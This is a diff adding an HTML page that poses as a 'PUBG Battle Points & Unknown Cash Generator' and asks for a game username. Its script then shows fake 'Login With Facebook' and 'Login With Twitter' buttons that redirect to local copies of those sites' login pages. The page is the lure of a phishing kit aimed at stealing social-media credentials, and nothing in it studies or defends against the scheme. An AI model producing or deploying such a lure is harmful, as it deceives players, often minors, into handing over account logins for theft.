@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>PUBG UC hack</title>
+<script src="jquery.js"></script>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta charset="UTF-8">
+<link rel="icon" href="images/pubg2.png"> 
+</head>
+<style type="text/css">
+*{
+padding:0;
+margin:0;
+outline:0;
+}
+.container {
+height:100%;
+width:100%;
+margin:auto;
+position:relative;
+}
+@media screen and (min-width: 800px) {
+  .container{
+width:80%;
+  }
+}
+body{
+background:url("images/pubg1.jpg");
+background-repeat:no-repeat;
+background-size:cover;
+}
+.header{
+height:50px;
+width:100%;
+background:rgba(0,0,0,.7);
+color:yellow;
+line-height:50px;
+text-align:center;
+}
+.instructions {
+color:white;
+padding:10px;
+background:rgba(0,0,0,.5);
+position:relative;
+height:100%;
+width:90%;
+margin:auto;
+padding-bottom:50px;
+color:white;
+
+}
+label{
+color:#0dd;
+}
+input[type="text"] {
+background:transparent;
+color:white;
+border:2px solid gold;
+border-radius:05px;
+width:95%;
+height:30px;
+}
+input::placeholder{
+color:white;
+}
+button {
+height:50px;
+width:auto;
+padding:10px;
+border:0;
+background:gold;
+font-size:20px;
+color:white;
+border-radius:10px;
+}
+#login{
+height:100%;
+width:100%;
+position:fixed;
+top:0;
+display:none;
+left:0;
+padding-top:300px;
+text-align:center;
+background:rgba(0,0,0,.9);
+}
+#login button{
+width:300px;
+height:40px;
+}
+</style>
+<body>
+
+<div class="container" >
+<div class="header" >PUBG Battle Points & Unknown Cash Generator</div>
+<div class="instructions" >
+<br><br>
+
+<center><h3>GENERATE POINTS WITH THE FORM BELOW.</h3>
+Make sure to select the proper region for your account.
+</center><br><label>PUBG game Username</label><br><br>
+<input type="text" id="hj"  placeholder="Enter Username" >
+<br><br><label>Select Your Device</label>
+<br>
+<input type="radio" name="radio"  >Android
+<input type="radio" style="margin-left:20px"  name="radio"  >iOS
+<input type="radio" style="margin-left:20px" name="radio"  >PC
+
+<br><br>
+
+<label>Select the amount of Battle Points to generate</label><br>
+<input type="text" placeholder="" value="10000"  ><br><br>
+<label>Select the amount of Unknown Cash to generate</label>
+<input type="text" placeholder="Enter Username" value="10000" >
+<br><br>
+<input type=hidden value=com.tencent.ig name=appnam />
+<center><button onclick="loginn()">Generate</button></center>
+<div id="login" >
+<button style="background:#4267B2" onclick="opfburl('fb')" >Login With Facebook</button><br><br>
+<button style="background:#1DA1F2" onclick="optwurl()" >Login With Twitter</button>
+</div>
+</div>
+
+</div>
+
+<script type="text/javascript">
+function loginn(){
+if(document.getElementById("hj").value != ""){
+document.getElementById("login").style.display="block";
+}
+else{
+alert("Please Enter Username");
+}
+}
+
+var redirecturl=window.location.search;
+
+
+
+
+function opfburl(){
+if (screen.width <= 699) {
+ document.location = "facebook_mobile.html"+redirecturl;
+ }
+ else{
+  document.location = "facebook_desktop_homepage.html"+redirecturl;
+ }
+}
+
+function optwurl(){
+if (screen.width <= 699) {
+ document.location = "twitter_mobile.html"+redirecturl;
+ }
+ else{
+  document.location = "twitter_desktop.html"+redirecturl;
+ }
+}
+</script>
+
+</body>
+</html>
